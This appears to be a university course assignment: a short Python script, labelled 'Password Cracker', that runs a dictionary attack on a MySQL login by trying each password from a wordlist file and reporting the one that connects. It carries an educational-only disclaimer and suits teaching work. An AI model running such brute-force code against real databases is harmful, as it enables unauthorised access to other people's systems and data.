'''
CSC 3022 - Security Fundamentals and Databases - Fall 2025
Instructor: Thyago Mota
Student(s):
Description: Final - Password Cracker
Disclaimer: 
    
    The code and instructions provided are intended solely for educational purposes. They are designed to help learners understand security concepts and practices in a controlled, academic environment.

    Do not use this code or any related techniques to perform penetration testing or security assessments on production systems, live environments, or systems under active development without proper authorization.

    The instructor and course facilitators are not responsible for any misuse of the materials or any consequences resulting from unauthorized testing or deployment.
    
'''

import mysql.connector
from mysql.connector import Error

# Prompt user for database connection details
host = input("Host: ")
port = input("Port: ")
database = input("Database: ")
user = input("User: ")

# Read passwords from the dictionary file
with open('100_db_passwords.txt', 'r') as f:
    passwords = [line.strip() for line in f if line.strip()]

# Try each password until a successful connection is made
for password in passwords:
    try:
        connection = mysql.connector.connect(
            host=host,
            port=port,
            database=database,
            user=user,
            password=password
        )
        if connection.is_connected():
            print(f"✅ Successfully connected using password: {password}")
            connection.close()
            break
    except Error:
        print(f"❌ Failed to connect using password: {password}")
else:
    print("🚫 Could not connect using any of the passwords in the dictionary.")
